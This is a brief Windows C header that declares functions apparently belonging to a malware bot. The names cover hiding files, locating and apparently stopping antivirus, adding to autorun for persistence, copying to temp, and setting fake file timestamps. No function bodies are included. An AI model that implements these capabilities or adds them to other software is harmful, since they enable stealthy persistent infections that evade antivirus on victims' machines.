#include <windows.h>

DWORD SignalFirstRun( DWORD dwParam );
DWORD GetNameHash( WCHAR *Path );
DWORD GetBotHash();

BOOL IsHide( DWORD dwFileHash );
BOOL IsHideFile( WCHAR *pwszFile, ULONG iFileLen );

WCHAR *GetBotPath();
WCHAR *GetStopAVPath();
WCHAR *GetMiniAVPath();

WCHAR *GetTempName();
WCHAR *GetNameFromPath( WCHAR *Path );
WCHAR *GetShellFoldersKey( DWORD dwParam );

void AddToAutoRun( WCHAR *ModulePath );
void CopyFileToTemp( WCHAR *Path, WCHAR *Temp );
void AddToAutoRun( WCHAR *TempFileName );
void SetFakeFileDateTime( WCHAR *Path );

char *GetTempNameA();